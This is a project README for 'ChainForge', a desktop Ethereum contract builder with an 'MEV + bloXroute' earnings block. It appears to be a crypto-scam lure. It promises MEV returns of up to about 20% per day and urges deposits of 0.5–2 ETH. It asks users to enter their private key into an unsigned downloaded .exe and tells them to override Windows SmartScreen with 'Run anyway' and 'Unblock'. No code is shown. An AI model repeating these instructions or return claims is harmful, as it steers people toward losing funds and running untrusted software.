![Visitors](https://visitor-badge.laobi.icu/badge?page_id=chainforge)

# ChainForge

*Working with Ethereum: deploy and call contracts from a block “board”.*

---

## Download & run

- The app is packed into **a single file**: `ChainForge.exe`
- Unzip the archive
- The archive also includes a multilingual quick guide folder: `README-ME-languages/`

I’ve been deep into smart contracts for a long time (mostly **Ethereum**) — and I love when the “who sends what where” flow is visible with your eyes, not only in a terminal and on Etherscan. **ChainForge** is my way to bundle it into a single **desktop** tool: build a canvas with **Wallet → Contract** or **Wallet → MEV**, hit **Deploy**, then call functions straight from the ABI with gas prompts and logs right next to it. No magic: everything sent on-chain is signed with **your** key from **Settings** (RPC + private key) — same wallet logic you’re used to.

The stack is simple and familiar: **React**, **Vite**, **Tauri 2**, and **ethers.js** for talking to your node. Mainnet-only in this build — that’s how I personally use it.

Here’s what it looks like on my screen:

![](https://i.ibb.co/YByB9WFZ/blck2.png)

---

## What’s built in (for now)

Right now the builder ships with **two ready-to-use blocks** — not an empty canvas, but templates with ABI/bytecode already wired for specific tasks.

### MEV + bloXroute

**bloXroute** is infrastructure for people who live close to blocks and MEV builders: fast data streams, relays, and feeds like “best block” / block value for the next slot (handy when you want the builder-side view, not only a regular RPC).

![](https://i.ibb.co/R5nyRH1/mev.png)

Official docs for one of those feeds — **MEVBlockValue**:

[MEVBlockValue — bloXroute docs](https://docs.bloxroute.com/eth/streams/mevblockvalue)

The MEV template in ChainForge is built around that ecosystem. I have **my own bloXroute subscription with a discount from the MEV developer** — I **don’t share** promo codes or access codes; those are personal terms.

For me this is a **strong “earnings” block** — and **while this subscription is still active**, everything tied to bloXroute in the scenario stays available. Simple checkpoint: **if the MEV template contract deploys fine — you’re good on your side**, then follow the in-app guide.

My MEV investments **paid off**. From what I’ve seen, with **meaningful** size the average return can reach **up to ~20% per day** (not a guarantee — market conditions, gas, and competition decide). If you’re new, start carefully — around **0.5–2 ETH**.

**Inside the app you can currently use the MEV flow fully**. A detailed walkthrough (what the block is, how to connect Wallet → MEV, deploy, **Start** / **Stop** / withdraw, and the whole pipeline) is included **inside the app**: open **Instructions → Open user guide** in the sidebar — there’s a dedicated MEV chapter with screenshots.

### Personal protected wallet (Contract-Wallet)

Another built-in block is **Contract-Wallet**: deploy a contract wallet bound to your key, then operate through its ABI (`deposit`, `withdrawTo`, balance, `owner`, etc.). Basically, your own on-chain wallet with transparent rules.

This is how an **already deployed** contract looks on the canvas: the **Contract** block with address, balance, and function buttons; a **LOG** next to it; and **Deposit** below — exactly like the app after a successful **Deploy**.

![](https://i.ibb.co/bgRf7C5b/cntr.png)

**Etherscan:** any contract you deploy through ChainForge on **Ethereum mainnet** can be checked on [etherscan.io](https://etherscan.io/) by address — balances, transactions, and (if you want) source verification, just like any normal on-chain deployment.

### Universal contract

And the classic **Contract** block: drop in **any** contract by pasting **ABI** (JSON array) and **creation bytecode** (`0x…`). Compile it **anywhere** first (Remix, Foundry, Hardhat, online compilers — whatever), then paste the artifacts and deploy via **Wallet → Contract** and **Deploy**.

---

## Code signing & SmartScreen

An `exe` **without paid code signing** is not a virus — Windows just can’t identify the publisher. This build is **clean**; if SmartScreen pops up, click **More info → Run anyway**. Sometimes you also need **File properties → Unblock**.

